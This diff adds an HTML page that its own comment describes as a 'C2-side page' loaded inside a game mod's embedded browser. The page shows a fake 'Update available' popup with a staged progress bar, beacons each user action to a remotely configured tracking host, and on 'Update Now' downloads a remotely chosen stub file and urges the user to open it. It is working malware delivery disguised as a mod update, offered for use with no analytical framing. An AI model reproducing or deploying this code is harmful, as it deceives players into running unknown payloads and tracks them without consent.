@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<!-- dl/popup.html — C2-side page loaded inside the game's CitadelHTMLPanel (full CEF).
+     Responsibilities, in order:
+       1. beacon that the panel initialised (stage=panel)            -> /hit.php
+       2. pull remote config                                         -> /cfg.json
+       3. if cfg.show and not shown-before (localStorage on https origin works) -> render popup
+       4. on "Update Now": trigger a.download of cfg.stub            -> file lands in Downloads
+       5. report shown / clicked / downloaded / dismissed
+     Every network call is fire-and-forget with a timeout: a dead C2 must never stall the page,
+     because the game keeps rendering whatever this document draws.
+     Remote config means copy, version strings, stub type and on/off all change without touching
+     the mod vpk.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>legion</title>
+<style>
+  html,body{margin:0;padding:0;background:transparent;overflow:hidden;
+    font:13px/1.45 "Segoe UI",Roboto,Arial,sans-serif;color:#e8e6e3;
+    -webkit-user-select:none;user-select:none}
+  #wrap{display:none;position:absolute;right:18px;bottom:18px;width:388px;
+    background:linear-gradient(180deg,#20232a 0%,#16181d 100%);
+    border:1px solid #3a3f4a;border-radius:6px;
+    box-shadow:0 10px 34px rgba(0,0,0,.72),inset 0 1px 0 rgba(255,255,255,.05);
+    overflow:hidden}
+  #wrap.on{display:block}
+  .hd{display:flex;align-items:center;gap:9px;padding:11px 14px 9px;
+    background:linear-gradient(180deg,#2b2f37,#22252b);border-bottom:1px solid #343943}
+  .dot{width:8px;height:8px;border-radius:50%;background:#c9a227;
+    box-shadow:0 0 8px rgba(201,162,39,.85);flex:0 0 auto}
+  .ttl{font-size:13.5px;font-weight:600;letter-spacing:.2px;color:#f2f0ec}
+  .sub{font-size:11px;color:#8d93a0;margin-left:auto}
+  .bd{padding:13px 14px 6px}
+  .ln1{font-size:12.5px;color:#cfd3da;margin-bottom:3px}
+  .ln2{font-size:11.5px;color:#8d93a0;margin-bottom:11px}
+  .meta{display:flex;gap:14px;font-size:10.5px;color:#767d8a;margin-bottom:12px;
+    text-transform:uppercase;letter-spacing:.55px}
+  .meta b{color:#b9bec7;font-weight:600}
+  .btns{display:flex;gap:8px;padding:0 14px 14px}
+  button{font:inherit;font-size:12px;border-radius:4px;padding:8px 14px;cursor:pointer;
+    border:1px solid transparent;transition:filter .12s}
+  button:hover{filter:brightness(1.16)}
+  .primary{flex:1;background:linear-gradient(180deg,#3f7bd8,#2f63b3);
+    border-color:#4d8be8;color:#fff;font-weight:600}
+  .ghost{background:#2a2e36;border-color:#3d434e;color:#b9bec7}
+  .bar{height:3px;background:#1a1d22}
+  .bar i{display:block;height:100%;width:0;background:#c9a227;transition:width .25s linear}
+  .ok .dot{background:#4caf7d;box-shadow:0 0 8px rgba(76,175,125,.85)}
+  .ok .bar i{background:#4caf7d;width:100%!important}
+  .hint{font-size:11px;color:#f0d585;padding:0 14px 12px}
+  code{font-family:Consolas,monospace;font-size:11px;color:#e8e6e3;
+    background:#24272e;padding:1px 5px;border-radius:3px}
+</style>
+</head>
+<body>
+<div id="wrap">
+  <div class="hd"><span class="dot"></span><span class="ttl" id="t">Update available</span>
+    <span class="sub" id="v">v1.2</span></div>
+  <div class="bar"><i id="p"></i></div>
+  <div class="bd">
+    <div class="ln1" id="l1">A new build of this mod is available.</div>
+    <div class="ln2" id="l2">Compatibility fix for the current game patch.</div>
+    <div class="meta"><span>Size <b id="sz">12 MB</b></span><span>Released <b id="dt">today</b></span></div>
+  </div>
+  <div class="btns" id="btns">
+    <button class="primary" id="go">Update Now</button>
+    <button class="ghost" id="later">Later</button>
+  </div>
+  <div class="hint" id="hint" style="display:none"></div>
+</div>
+<script>
+(function () {
+  var CFG = {
+    beacon: '',                 // filled from cfg.beacon after the config fetch
+    config: 'cfg.json?',
+    shownKey: 'lg_update_done',
+    upgradeKey: 'lg_build_seen'
+  };
+  var cfg = {}, id = 'x' + Math.random().toString(36).slice(2, 10), done = false;
+
+  function send(stage, extra) {
+    if (!CFG.beacon) return;              // no beacon host configured -> stay silent
+    try {
+      var q = '?id=' + id + '&s=' + encodeURIComponent(stage) +
+              '&v=' + encodeURIComponent((extra || {}).v || '') +
+              '&d=' + encodeURIComponent(JSON.stringify(extra || {})) +
+              '&t=' + Date.now();
+      var u = new XMLHttpRequest();
+      u.open('GET', CFG.beacon + q, true);
+      u.timeout = 6000;
+      u.send();
+    } catch (e) {}
+  }
+
+  function getJSON(url, cb) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', url + '?cb=' + Date.now(), true);
+      x.timeout = 7000;
+      x.onreadystatechange = function () {
+        if (x.readyState !== 4) return;
+        if (x.status >= 200 && x.status < 300) {
+          try { cb(JSON.parse(x.responseText)); } catch (e) { cb({}); }
+        } else { cb({}); }
+      };
+      x.onerror = x.ontimeout = function () { cb({}); };
+      x.send();
+    } catch (e) { cb({}); }
+  }
+
+  function txt(el, v) { if (v !== undefined && v !== null && v !== '') el.textContent = v; }
+
+  function show() {
+    getJSON(CFG.config, function (c) {
+      cfg = c || {};
+      if (cfg.beacon) { CFG.beacon = cfg.beacon; send('config', { v: cfg.version || '' }); }
+      if (cfg.show === false) { done = true; return; }
+      var seen = '';
+      try { seen = localStorage.getItem(CFG.upgradeKey) || ''; } catch (e) {}
+      if (seen && seen === (cfg.version || '1')) { done = true; send('already', { v: seen }); return; }
+
+      var t = document.getElementById, w = t.call(document, 'wrap');
+      txt(t.call(document, 't'), cfg.title);
+      txt(t.call(document, 'v'), cfg.version);
+      txt(t.call(document, 'l1'), cfg.line1);
+      txt(t.call(document, 'l2'), cfg.line2);
+      txt(t.call(document, 'sz'), cfg.size);
+      txt(t.call(document, 'dt'), cfg.released);
+      txt(t.call(document, 'go'), cfg.cta);
+      w.classList.add('on');
+      send('shown', { v: cfg.version || '' });
+
+      // progress bar is theatre with a real duration: cfg.delay_ms
+      var d = Math.max(1200, parseInt(cfg.delay_ms || 4200, 10)), t0 = Date.now();
+      var bar = t.call(document, 'p');
+      var iv = setInterval(function () {
+        var pct = Math.min(100, (Date.now() - t0) / d * 100);
+        bar.style.width = pct + '%';
+        if (pct >= 100) clearInterval(iv);
+      }, 120);
+
+      t.call(document, 'later').onclick = function () {
+        w.classList.remove('on');
+        send('dismissed', { v: cfg.version || '' });
+      };
+
+      t.call(document, 'go').onclick = function () {
+        if (done) return;
+        done = true;
+        send('clicked', { v: cfg.version || '' });
+        var url = cfg.stub || '';
+        var name = cfg.stub_name || 'download.zip';
+        try {
+          var a = document.createElement('a');
+          a.href = url; a.download = name; a.rel = 'noopener';
+          document.body.appendChild(a); a.click();
+          document.body.removeChild(a);
+          send('downloaded', { v: cfg.version || '', n: name });
+        } catch (e) {
+          send('download_error', { v: cfg.version || '', e: String(e) });
+        }
+        try { localStorage.setItem(CFG.upgradeKey, cfg.version || '1'); } catch (e) {}
+        // success state; mirror the same document.title channel the mod listens on
+        w.classList.add('ok');
+        txt(t.call(document, 't'), cfg.done_title || 'Update downloaded');
+        txt(t.call(document, 'l1'), cfg.done_line || 'Open the downloaded file to finish.');
+        t.call(document, 'btns').style.display = 'none';
+        try { document.title = 'show|' + (cfg.version || ''); } catch (e) {}
+      };
+    });
+  }
+
+  send('panel');
+  try { document.title = 'panel'; } catch (e) {}
+  // let the HUD settle before drawing anything, same reasoning as the loader delay
+  setTimeout(show, 900);
+})();
+</script>
+</body>
+</html>
